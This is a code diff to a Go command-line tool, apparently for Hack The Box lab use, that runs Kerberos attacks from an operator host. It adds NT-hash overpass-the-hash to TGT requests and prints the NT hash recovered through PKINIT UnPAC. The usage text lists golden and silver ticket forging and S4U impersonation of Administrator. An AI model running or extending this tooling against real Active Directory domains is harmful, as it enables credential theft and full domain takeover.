@@ -47,6 +47,7 @@ const krbUsage = `ark kerberos — operator-host Kerberos (no implant)
   ark kerberos ticket import <kirbi|ccache>
   ark kerberos ticket list
   ark kerberos asktgt --dc H --domain D --user U --pass-file P
+  ark kerberos asktgt --dc H --domain D --user U --hash NT   # overpass etype 23
   ark kerberos pkinit --pfx F --dc H --domain D --user U
   ark kerberos s4u --dc H --domain D --user ATTACK$ --pass-file P \
       --impersonate Administrator --spn cifs/dc.domain.htb [--altservice CIFS/other]
@@ -57,8 +58,10 @@ const krbUsage = `ark kerberos — operator-host Kerberos (no implant)
   ark kerberos golden --domain D --user Administrator --sid S-1-5-21-… --aes-file krbtgt.aes [--rid 500] [--kvno 2]
   ark kerberos silver --domain D --user Administrator --sid S-1-5-21-… --spn cifs/dc.d.htb --aes-file host.aes
 
-AES TGT / S4U only (no RC4). KeyList forges an RODC-kvno AES TGT then KERB-KEY-LIST
-for one NT hash (etype 23). --ticket uses an existing TGT instead of forging.
+AES TGT / S4U only (no RC4 passwords). AskTGT --hash is NT-hash overpass (RC4-HMAC).
+PKINIT UnPAC returns the NT hash and a TGT ccache.
+KeyList forges an RODC-kvno AES TGT then KERB-KEY-LIST for one NT hash (etype 23).
+--ticket uses an existing TGT instead of forging.
 Tickets land in ~/.ark/tickets (ARK_TICKET_DIR).
 with-skew wraps a command in libfaketime. Lab-only.
 `
@@ -141,6 +144,7 @@ func kerberosAskTGT(args []string) error {
 		Domain:   first(f, "domain"),
 		Username: first(f, "user", "username"),
 		Password: pass,
+		Hash:     first(f, "hash", "ntlm-hash"),
 		KDC:      first(f, "dc", "host", "kdc"),
 	})
 	if err != nil {
@@ -155,7 +159,7 @@ func kerberosAskTGT(args []string) error {
 func kerberosPKINIT(args []string) error {
 	f, _ := ParseFlags(args)
 	printProxyHint()
-	nt, err := krb.PKINIT(krb.PKINITOptions{
+	res, err := krb.PKINIT(krb.PKINITOptions{
 		Domain:   first(f, "domain"),
 		Username: first(f, "user", "username"),
 		KDC:      first(f, "dc", "host", "kdc"),
@@ -165,7 +169,11 @@ func kerberosPKINIT(args []string) error {
 	if err != nil {
 		return err
 	}
-	fmt.Printf("NT %s\n", nt)
+	fmt.Printf("ok pkinit nt=%s id=%s principal=%s@%s etype=%d skew_delta=%s\n",
+		res.NTHash, res.Ticket.ID, res.Ticket.Principal, res.Ticket.Realm, res.Ticket.EType, krb.FormatDelta(krb.ClockOffset()))
+	if res.Ticket.CCache != "" {
+		fmt.Printf("ccache %s\n", res.Ticket.CCache)
+	}
 	return nil
 }
 
